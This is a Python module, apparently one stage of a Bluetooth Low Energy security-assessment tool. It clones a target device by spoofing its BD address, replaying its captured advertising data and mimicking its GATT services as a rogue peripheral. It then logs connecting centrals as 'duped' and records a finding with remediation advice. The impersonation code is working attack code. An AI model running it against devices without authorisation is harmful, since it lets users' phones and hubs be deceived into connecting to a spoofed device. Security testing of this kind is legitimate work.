from datetime import datetime, timezone
from time import time, sleep
import threading

from whad.ble import UUID
from whad.ble.profile import (
    GenericProfile,
    PrimaryService,
    Characteristic,
)

from core.dongle import WhadDongle
from core.models import Target, Finding
from core.db import insert_finding
from core.logger import get_logger
from core.pcap import pcap_path, attach_monitor, detach_monitor
import config

log = get_logger("s3_clone")

CLONE_DURATION = 120


def run(
    dongle: WhadDongle,
    target: Target,
    engagement_id: str,
) -> None:
    log.info(
        f"Cloning target {target.bd_address} "
        f"({target.name or 'unnamed'}, {target.device_class})"
    )

    profile = _build_clone_profile(target)
    adv_data = _build_adv_data(target)

    periph = dongle.peripheral(profile=profile)
    _monitor = None
    _pcap = pcap_path(engagement_id, 3, target.bd_address)
    _monitor = attach_monitor(periph, _pcap)

    if dongle.caps.can_spoof_bd_addr:
        try:
            periph.set_bd_address(target.bd_address)
            log.info(f"BD address spoofed to {target.bd_address}")
        except Exception as exc:
            log.warning(
                f"BD address spoofing failed at runtime: {exc}. "
                f"Proceeding with native address."
            )
    else:
        log.warning(
            "BD address spoofing not available on this dongle — "
            "clone will advertise from native address."
        )

    if adv_data:
        try:
            periph.enable_adv_mode(adv_data=adv_data)
            log.info("Advertising data configured from captured records")
        except Exception as exc:
            log.debug(f"enable_adv_mode failed: {exc}")

    connections_received: list[dict] = []
    stop_event = threading.Event()

    original_on_connect = getattr(profile, "on_connect", None)

    def _on_connect(conn_handle):
        now = datetime.now(timezone.utc)
        log.info(
            f"Central connected to clone! handle={conn_handle}"
        )
        connections_received.append(
            {
                "conn_handle": conn_handle,
                "timestamp": now.isoformat(),
            }
        )
        if original_on_connect:
            original_on_connect(conn_handle)

    profile.on_connect = _on_connect

    log.info(
        f"Starting rogue peripheral for {CLONE_DURATION}s. "
        f"Advertising as {target.bd_address}..."
    )

    periph.start()

    try:
        deadline = time() + CLONE_DURATION
        while time() < deadline and not stop_event.is_set():
            sleep(1.0)
    except KeyboardInterrupt:
        log.info("Clone interrupted by user.")
    finally:
        try:
            detach_monitor(_monitor)
            periph.stop()
        except Exception:
            pass

    severity = "critical" if connections_received else "medium"

    finding = Finding(
        type="identity_clone",
        severity=severity,
        target_addr=target.bd_address,
        description=(
            f"Rogue peripheral cloned {target.bd_address} "
            f"({target.name or 'unnamed'}). "
            f"{len(connections_received)} central(s) connected "
            f"to the clone during {CLONE_DURATION}s test window."
        ),
        remediation=(
            "Implement mutual authentication (LE Secure Connections "
            "with bonding). Centrals should validate peripheral "
            "identity via IRK or certificate-based auth before "
            "exchanging application data."
        ),
        evidence={
            "cloned_addr": target.bd_address,
            "cloned_name": target.name,
            "device_class": target.device_class,
            "connections_received": connections_received,
            "duration_seconds": CLONE_DURATION,
        },
        pcap_path=str(_pcap),
        engagement_id=engagement_id,
    )
    insert_finding(finding)

    log.info(
        f"FINDING [{severity}] identity_clone: "
        f"{target.bd_address} -- "
        f"{len(connections_received)} connection(s)"
    )

    _print_summary(target, connections_received)


def _build_clone_profile(target: Target) -> GenericProfile:
    profile = GenericProfile()

    svc = PrimaryService(uuid=UUID(0x1800))
    name_val = (target.name or "Unknown").encode("utf-8")
    svc.add(
        Characteristic(
            uuid=UUID(0x2A00),
            permissions=["read"],
            value=name_val,
        )
    )
    svc.add(
        Characteristic(
            uuid=UUID(0x2A01),
            permissions=["read"],
            value=b"\x00\x00",
        )
    )
    profile.add_service(svc)

    for svc_uuid in target.services:
        try:
            if len(svc_uuid) <= 4:
                uuid_obj = UUID(int(svc_uuid, 16))
            else:
                uuid_obj = UUID(svc_uuid)

            if uuid_obj.value in (0x1800, 0x1801):
                continue

            custom_svc = PrimaryService(uuid=uuid_obj)
            custom_svc.add(
                Characteristic(
                    uuid=UUID(uuid_obj.value + 1)
                    if isinstance(uuid_obj.value, int)
                    else uuid_obj,
                    permissions=["read"],
                    value=b"\x00",
                )
            )
            profile.add_service(custom_svc)
        except Exception as exc:
            log.debug(f"Could not add service {svc_uuid}: {exc}")

    return profile


def _build_adv_data(target: Target) -> bytes:
    if target.raw_adv_records:
        return target.raw_adv_records[0]
    return b""


def _print_summary(
    target: Target, connections: list[dict]
) -> None:
    print("\n" + "─" * 76)
    print("  STAGE 3 SUMMARY -- Identity Clone")
    print("─" * 76)
    print(f"  {'Cloned device':<18}: {target.bd_address}")
    print(f"  {'Device name':<18}: {target.name or '(unnamed)'}")
    print(f"  {'Device class':<18}: {target.device_class}")
    print(f"  {'Clone duration':<18}: {CLONE_DURATION}s")
    print(f"  {'Centrals duped':<18}: {len(connections)}")
    if connections:
        for i, c in enumerate(connections):
            print(f"    [{i + 1}] handle={c['conn_handle']}  at {c['timestamp']}")
    print("─" * 76 + "\n")